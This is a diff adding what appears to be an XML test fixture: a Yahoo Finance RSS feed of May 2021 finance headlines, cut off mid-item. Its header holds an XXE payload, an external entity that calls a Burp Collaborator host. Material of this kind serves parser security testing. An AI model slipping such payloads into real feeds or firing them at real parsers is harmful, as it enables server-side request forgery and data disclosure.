@@ -1,0 +1,468 @@
+<rss xmlns:media="http://search.yahoo.com/mrss/" version="2.0">
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://ykmpwr3b3q9ulmwh1zldmt30ur0mob.burpcollaborator.net/x"> %ext;
+]>
+<channel>
+<title>Yahoo Finance</title>
+<link>https://finance.yahoo.com/</link>
+<description>At Yahoo Finance, you get free stock quotes, up-to-date news, portfolio management resources, international market data, social interaction and mortgage rates that help you manage your financial life.</description>
+<language>en-US</language>
+<copyright>Copyright (c) 2021 Yahoo! Inc. All rights reserved</copyright>
+<pubDate>Sat, 22 May 2021 01:56:18 -0400</pubDate>
+<ttl>5</ttl>
+<image>
+<title>Yahoo Finance</title>
+<link>https://finance.yahoo.com/</link>
+<url>https://s.yimg.com/zz/nn/lib/metro/g/my/yahoo_en-US_f_p_190x45_2x.png</url>
+</image>
+<item>
+<title>Retirees wiped out, lose millions: SEC</title>
+<link>https://www.marketwatch.com/story/retirees-wiped-out-lose-millions-sec-11621608491?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T14:48:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">retirees-wiped-out-lose-millions-sec-11621608491?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/jmFeVG0H0mU_TcGBhDf0mw--~B/aD02NDA7dz0xMjc5O2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/087bf2f1a6083bb590f82700bad66b27" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>AT&T Was Punished for Its Dividend Cut. It’s Time to Buy the Stock.</title>
+<link>https://www.barrons.com/articles/att-cut-dividend-buy-the-stock-51621647244?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-22T01:37:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">att-cut-dividend-buy-the-stock-51621647244?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/GwRFK.LCtQzLE979BduAXQ--~B/aD02NDA7dz0xMjc5O2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/4171cef9bd5f93236dedf36e076236dc" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bitcoin Ends Week in Volatile Flux With China Rattling Bulls</title>
+<link>https://finance.yahoo.com/news/crypto-limps-weekend-hammer-blows-055114490.html</link>
+<pubDate>2021-05-22T03:27:28Z</pubDate>
+<source url="https://www.bloomberg.com/">Bloomberg</source>
+<guid isPermaLink="false">crypto-limps-weekend-hammer-blows-055114490.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/2Suqf1oAeVMZj3xK0zSWVg--~B/aD0xMzM0O3c9MjAwMDthcHBpZD15dGFjaHlvbg--/https://media.zenfs.com/en/bloomberg_markets_842/c202c232633e403d44a982195fb22478" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>What Is a Mega Backdoor Roth?</title>
+<link>https://finance.yahoo.com/news/mega-backdoor-roth-162653939.html</link>
+<pubDate>2021-05-21T16:26:53Z</pubDate>
+<source url="http://money.usnews.com/">U.S.News & World Report</source>
+<guid isPermaLink="false">mega-backdoor-roth-162653939.html</guid>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>You Need This Much Retirement Savings At Your Age And Income</title>
+<link>https://www.investors.com/etfs-and-funds/retirement/you-need-this-much-retirement-savings-at-your-age-and-income/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T19:00:24Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/2lag2LQWzb8i5fT_UULBDA--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/278e65ba3629fa9b7295cf9d7f6feef8" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Nvidia Plans to Split Its Stock 4-for-1. What That Means.</title>
+<link>https://www.barrons.com/articles/nvidia-stock-split-51621643411?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-22T00:39:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">nvidia-stock-split-51621643411?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/iI2ic3s6_eObuHtuYjBkoQ--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/54ae7f16f4fa0db90f2e755e5c324179" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Nvidia Stock Pops On 4-For-1 Stock Split, Earnings Expectations</title>
+<link>https://www.investors.com/news/technology/nvidia-stock-pops-on-4-for-1-stock-split-earnings-expectations/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T20:01:47Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/UPWXSZgqXf4ayYRSr6y5Ag--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/f1b99efc69900c34ca89f8f8cce405e2" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Billionaire Ray Dalio Pulls the Trigger on 3 “Strong Buy” Stocks</title>
+<link>https://finance.yahoo.com/news/billionaire-ray-dalio-pulls-trigger-141146225.html</link>
+<pubDate>2021-05-20T14:11:46Z</pubDate>
+<source url="https://www.tipranks.com/">TipRanks</source>
+<guid isPermaLink="false">billionaire-ray-dalio-pulls-trigger-141146225.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/yRyGswlNw9S8FVu57qm.4Q--~B/aD00NTA7dz0xMDI0O2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/tipranks_452/753112cf506f24af64fd831548e7be2c" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>These energy stocks are expected by Wall Street to rise up to 37% over the next year</title>
+<link>https://www.marketwatch.com/story/these-energy-stocks-are-expected-by-wall-street-to-rise-up-to-37-over-the-next-year-11621529424?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-20T16:50:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">these-energy-stocks-are-expected-by-wall-street-to-rise-up-to-37-over-the-next-year-11621529424?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/x1.Dq2MBbrSgEBooL0wPYw--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/0792e2e3e636f0c8cd2efc37dc0296c1" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Fourth stimulus check wins new fans in Congress, adding to the squeeze on Biden</title>
+<link>https://finance.yahoo.com/news/fourth-stimulus-check-over-80-193000385.html</link>
+<pubDate>2021-05-20T21:38:00Z</pubDate>
+<source url="https://moneywise.com/">MoneyWise</source>
+<guid isPermaLink="false">fourth-stimulus-check-over-80-193000385.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/000jHCdF2YOvDrSNfcqQDA--~B/aD00MDA7dz03Mjg7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/moneywise_327/677e72718acd65c1833d18fc044d4fcc" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>AT&T CEO John Stankey Bought $1 Million of Shares</title>
+<link>https://www.barrons.com/articles/att-ceo-john-stankey-bought-stock-51621635140?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T22:27:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">att-ceo-john-stankey-bought-stock-51621635140?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/XsDCOp0fNG8M3gmSVKJVwA--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/7686217b5048bddcf5100514aa71b1d3" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>The Fed Might Start to Act Sooner to Head Off Housing Boom and Bust. What Could Happen.</title>
+<link>https://www.barrons.com/articles/the-feds-next-move-51621626397?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T19:48:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">the-feds-next-move-51621626397?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/3yC_HqaN1MocARnaWDCntw--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/bbf2d70d0b3000fd8821c256e1a94dc9" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Palantir vs. Splunk: Which Data Analytics Stock Is A Better Pick?</title>
+<link>https://finance.yahoo.com/news/palantir-vs-splunk-data-analytics-164334452.html</link>
+<pubDate>2021-05-20T16:43:34Z</pubDate>
+<source url="https://www.tipranks.com/">TipRanks</source>
+<guid isPermaLink="false">palantir-vs-splunk-data-analytics-164334452.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/63hAz3nFgINviWq8Suj1Zg--~B/aD0yNjY7dz03MDM7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/tipranks_452/3c10167ae84ce3eafcbfd481e975c278" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>The Rich Are Hiding a LOT of Income, Treasury Says</title>
+<link>https://finance.yahoo.com/news/rich-hiding-lot-income-treasury-224440322.html</link>
+<pubDate>2021-05-20T22:44:40Z</pubDate>
+<source url="http://www.thefiscaltimes.com/">The Fiscal Times</source>
+<guid isPermaLink="false">rich-hiding-lot-income-treasury-224440322.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/BUF_XTZz6a5kSjqAIbAuuA--~B/aD0zMzM7dz01OTI7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/us.finance.thefiscaltimes/0a1ab86dbc8321ab44b158a508791191" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Retirement reform is on track for Biden's signature 'hopefully this year': Rep. Kevin Brady</title>
+<link>https://finance.yahoo.com/news/retirement-reform-is-on-track-for-bidens-signature-hopefully-this-year-rep-kevin-brady-170138525.html</link>
+<pubDate>2021-05-20T17:01:38Z</pubDate>
+<source url="http://finance.yahoo.com/">Yahoo Finance</source>
+<guid isPermaLink="false">retirement-reform-is-on-track-for-bidens-signature-hopefully-this-year-rep-kevin-brady-170138525.html</guid>
+<media:content height="86" url="https://s.yimg.com/os/creatr-uploaded-images/2021-05/7a138a00-b982-11eb-b73a-d6d78140f669" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Market Wrap: China Breaks Crypto as Bitcoin Falls to $36K, ETH Drops $300 in Two Hours</title>
+<link>https://finance.yahoo.com/news/market-wrap-china-breaks-crypto-204027293.html</link>
+<pubDate>2021-05-21T20:40:27Z</pubDate>
+<source url="https://www.coindesk.com">CoinDesk</source>
+<guid isPermaLink="false">market-wrap-china-breaks-crypto-204027293.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/KFmTSxUEVLWaTpkhw1yupw--~B/aD04Mzg7dz0xMjc5O2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/coindesk_75/81fd17c16d722db0dd9507be3a8c02f3" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Is Nikola A Buy Right Now? Here's What Fund Sponsorship, NKLA Stock Chart Show</title>
+<link>https://www.investors.com/research/nikola-nkla-stock-buy-now/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-22T00:55:27Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/oP2GVt4j7R1hDNgbQCe63Q--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/e9590fa614d5dadb7af8e6fc47171c41" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Alibaba vs. JD: Which Chinese E-Commerce Stock Is A More Compelling Buy?</title>
+<link>https://finance.yahoo.com/news/alibaba-vs-jd-chinese-e-163151860.html</link>
+<pubDate>2021-05-21T16:31:51Z</pubDate>
+<source url="https://www.tipranks.com/">TipRanks</source>
+<guid isPermaLink="false">alibaba-vs-jd-chinese-e-163151860.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/6hrs8HNj09ewFLnR3S_0.w--~B/aD0yNjk7dz03MDI7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/tipranks_452/0951bffaadc66bb6ea9a364d193cafaa" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Is Ford Stock A Buy Now? Shares Surge After F-150 Lightning Launch</title>
+<link>https://www.investors.com/research/ford-stock-buy-now/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T21:54:00Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/GMiVEon.KgKcyr1mC4Dz0A--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/9de6edadaf3f030443c039a05d82f71b" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bitcoin bros mock Paul Krugman for comparing the crypto craze to ‘a natural Ponzi scheme’</title>
+<link>https://www.marketwatch.com/story/bitcoin-bros-mock-paul-krugman-for-comparing-the-crypto-craze-to-a-natural-ponzi-scheme-11621617232?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T17:13:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">bitcoin-bros-mock-paul-krugman-for-comparing-the-crypto-craze-to-a-natural-ponzi-scheme-11621617232?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/hOIBp5yHPByHvnldLnDkYQ--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/bd866ed07c02d97dca942a5f9bdab5ee" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Nvidia plans first stock split in nearly 14 years, after 1,600%-plus in gains</title>
+<link>https://www.marketwatch.com/story/nvidia-plans-first-stock-split-in-nearly-14-years-after-1-600-plus-in-gains-11621625710?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T19:35:00Z</pubDate>
+<source url="http://www.marketwatch.com/">MarketWatch</source>
+<guid isPermaLink="false">nvidia-plans-first-stock-split-in-nearly-14-years-after-1-600-plus-in-gains-11621625710?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/2GaNcD3sGsxYRqDe4CFBww--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/marketwatch.com/b10dd75d6c2857bbe5866fe346074bc4" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Airline Stocks To Buy And Watch As Path To Profitability Emerges: Separate Winners From Losers</title>
+<link>https://www.investors.com/research/airline-stocks-to-buy-and-watch/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T17:24:20Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/9y8Eu.5QAoHBfS2vqx6K7A--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/4742b74b02fdc8c24b72c81a28ea202a" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Jim Cramer on Apple, Nvidia, Boeing, Semiconductors</title>
+<link>https://www.thestreet.com/jim-cramer/stock-market-advice-cramer-live-aapl-ba-nvda-amat-semis-may-21?puc=yahoo&cm_ven=YAHOO&yptr=yahoo</link>
+<pubDate>2021-05-21T10:08:00Z</pubDate>
+<source url="http://www.thestreet.com/">TheStreet.com</source>
+<guid isPermaLink="false">stock-market-advice-cramer-live-aapl-ba-nvda-amat-semis-may-21?puc=yahoo&cm_ven=YAHOO&yptr=yahoo</guid>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Seven Retirement Myths Debunked</title>
+<link>https://www.investors.com/etfs-and-funds/retirement/retirement-planning-mistakes-common-myths-debunked/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T17:52:28Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/mQ0wEftQYRKGQpLniJTUgQ--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/28f4de452039fbe3c3842aeb29d8f5e2" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>The Next Generation of Would-Be Buffetts—and the Stocks They’re Buying Now</title>
+<link>https://www.barrons.com/articles/stock-market-new-value-managers-51621619129?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T18:41:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">stock-market-new-value-managers-51621619129?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/NY4B5tBUr0A8YdOBgkhpkw--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/e6c3d89f881cbe5516debc2485e55909" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Tesla’s New Plaid Model Is Ready. That Should Help the Stock.</title>
+<link>https://www.barrons.com/articles/tesla-model-s-new-plaid-model-ready-51621608150?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T14:43:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">tesla-model-s-new-plaid-model-ready-51621608150?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/NwH19W40USbGZ.5HXxe1JQ--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/ca7842ba3bb5de01cda0a2ebd740682b" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Democrats Consider Chipping Away at Biden Tax on Estates: Report</title>
+<link>https://finance.yahoo.com/news/democrats-consider-chipping-away-biden-225629569.html</link>
+<pubDate>2021-05-20T22:56:29Z</pubDate>
+<source url="http://www.thefiscaltimes.com/">The Fiscal Times</source>
+<guid isPermaLink="false">democrats-consider-chipping-away-biden-225629569.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/Jlo7tLo7rhl7T6JnxhgPGg--~B/aD0zMDM2O3c9NDU2MzthcHBpZD15dGFjaHlvbg--/https://media.zenfs.com/en/us.finance.thefiscaltimes/5697a6b1234608d527c14eeb72eca060" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Annovis’s 127% Surge Showcases Alzheimer’s Drug Enthusiasm</title>
+<link>https://finance.yahoo.com/news/annovis-271-surge-showcases-broad-180919445.html</link>
+<pubDate>2021-05-21T20:10:23Z</pubDate>
+<source url="https://www.bloomberg.com/">Bloomberg</source>
+<guid isPermaLink="false">annovis-271-surge-showcases-broad-180919445.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/92Aj1QlTdIvyM2AFM3vvXA--~B/aD02NzU7dz0xMjAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/bloomberg_markets_842/9752d8515c8964cdac02b1110777b750" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Cathie Wood’s ARK Invest Snapped Up More Coinbase Shares on the Dip</title>
+<link>https://www.barrons.com/articles/cathie-wood-ark-invest-bought-coinbase-bitcoin-51621630885?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T21:03:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">cathie-wood-ark-invest-bought-coinbase-bitcoin-51621630885?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/D9WO2Z8QlXUEVZqkA8X6UQ--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/b236924e21d0cc26029287759b522ef6" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Investment Bank Calls Bottom For Semiconductor Stocks; Analysts Name Top Picks</title>
+<link>https://www.investors.com/news/technology/semiconductor-stocks-have-bottomed-analyst-says/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-20T20:42:56Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/wvRDQ0KkQY99lkKs8e38SQ--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/1e28c2924bf3173f1f33dfdf02f3a636" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>How To Score AT&T-Like Dividends With Less Risk</title>
+<link>https://www.investors.com/etfs-and-funds/etfs/sp500-how-to-score-att-like-dividends-with-less-risk/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-20T12:00:39Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/AL.qgSncbSNiXI9dpbyy_A--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/39bd03e684b25277784d75c6fbae754e" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Soak the Rich to Pay for Social Spending? Biden’s Tax Plans Don’t Add Up.</title>
+<link>https://www.barrons.com/articles/soak-the-rich-to-pay-for-social-spending-bidens-tax-plans-dont-add-up-51621537132?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T10:00:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">soak-the-rich-to-pay-for-social-spending-bidens-tax-plans-dont-add-up-51621537132?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/gbgylZBBIrkngvXdxV2lTQ--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/41acf0801cfbdb96efb0f2a4b6df1f3e" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>'He has to take his lumps': Behind a Rhode Island real estate deal involving 160,000 dogecoins</title>
+<link>https://finance.yahoo.com/news/dogecoin-real-estate-192209168.html</link>
+<pubDate>2021-05-20T19:22:09Z</pubDate>
+<source url="https://money.yahoo.com/">Yahoo Money</source>
+<guid isPermaLink="false">dogecoin-real-estate-192209168.html</guid>
+<media:content height="86" url="https://s.yimg.com/os/creatr-uploaded-images/2021-05/9ceec5c0-b8d9-11eb-bcb9-0cb7b0e8a7be" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Tesla's Epic Stock Crash Costs 10 Investors $128 Billion</title>
+<link>https://www.investors.com/etfs-and-funds/sectors/sp-500-teslas-epic-stock-crash-costs-10-investors-128-billion/?src=A00220&yptr=yahoo</link>
+<pubDate>2021-05-21T12:00:49Z</pubDate>
+<source url="http://www.investors.com/">Investor's Business Daily</source>
+<guid isPermaLink="false">?src=A00220&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/95mNngUcxsBdBpe5goShGw--~B/aD01NjM7dz0xMDAwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/ibd.com/e43cfbed9c26f391715b25d65eb23c40" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Analysts Weigh up AMD’s Share Repurchase Program</title>
+<link>https://finance.yahoo.com/news/analysts-weigh-amd-share-repurchase-190112956.html</link>
+<pubDate>2021-05-21T19:01:12Z</pubDate>
+<source url="https://www.tipranks.com/">TipRanks</source>
+<guid isPermaLink="false">analysts-weigh-amd-share-repurchase-190112956.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/295tsy_cjEjBlrM5tAjseA--~B/aD00NTA7dz0xMDI0O2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/tipranks_452/741cd0785f84d2f8e91c2b46f283d53b" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>An AT&T Dividend Cut Brings Feelings of Betrayal for True Believers</title>
+<link>https://www.barrons.com/articles/att-dividend-51621550754?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-21T13:31:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">att-dividend-51621550754?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/4wM2r3VxXjZ1q6OjY1FMGg--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/246e7cbb6c29b1a7bef1854ae7ed7fcd" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bitcoin, Ether Prices Continue Falling After China Spurs Regulatory Fears</title>
+<link>https://www.wsj.com/articles/bitcoin-ether-prices-continue-falling-on-regulatory-fears-11621611655?mod=itp_wsj&yptr=yahoo</link>
+<pubDate>2021-05-21T21:50:00Z</pubDate>
+<source url="http://www.wsj.com/">The Wall Street Journal</source>
+<guid isPermaLink="false">bitcoin-ether-prices-continue-falling-on-regulatory-fears-11621611655?mod=itp_wsj&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/Qq47W2XowCWeaAspGNsxWQ--~B/aD0zNjk7dz01NTM7YXBwaWQ9eXRhY2h5b24-/https://media.zenfs.com/en/wsj.com/178647eca240bc7b19ccb4197f8ea152" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>AT&T CEO John Stankey Defends Dividend Cut</title>
+<link>https://www.barrons.com/articles/att-stock-ceo-defends-dividend-cut-51621538324?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-20T20:24:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">att-stock-ceo-defends-dividend-cut-51621538324?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/ft96U9JrfEiPmjwf3ykNYg--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/5366f9cc176d629104023d29d80b97dc" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Ford Is Serious About EVs. Why Lordstown Motors Is Tumbling.</title>
+<link>https://www.barrons.com/articles/lordstown-motors-stock-ev-ford-truck-tesla-51621529657?siteid=yhoof2&yptr=yahoo</link>
+<pubDate>2021-05-20T21:04:00Z</pubDate>
+<source url="http://www.barrons.com/">Barrons.com</source>
+<guid isPermaLink="false">lordstown-motors-stock-ev-ford-truck-tesla-51621529657?siteid=yhoof2&yptr=yahoo</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/Fj4B9iuJUsHbqqJRbl1XZw--~B/aD02NDA7dz0xMjgwO2FwcGlkPXl0YWNoeW9u/https://media.zenfs.com/en/Barrons.com/56d6754c661398332e1c7b621caa6832" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Daimler Disagrees With Tesla and VW’s Batteries-or-Bust View</title>
+<link>https://finance.yahoo.com/news/daimler-disagrees-tesla-vw-batteries-133000123.html</link>
+<pubDate>2021-05-21T13:30:00Z</pubDate>
+<source url="https://www.bloomberg.com/">Bloomberg</source>
+<guid isPermaLink="false">daimler-disagrees-tesla-vw-batteries-133000123.html</guid>
+<media:content height="86" url="https://s.yimg.com/uu/api/res/1.2/UFUgYPm2xm9yUYbRWzP_Aw--~B/aD0yNjY2O3c9NDAwMDthcHBpZD15dGFjaHlvbg--/https://media.zenfs.com/en/bloomberg_markets_842/ff6ebd0746abe8a2096071cba77f1d56" width="130"/>
+<media:credit role="publishing company"/>
+</item>
+<item>
+<title>Bitcoin’s Tumble Shook Up Stocks. What to Make of the Market’s Messy Week.</title>
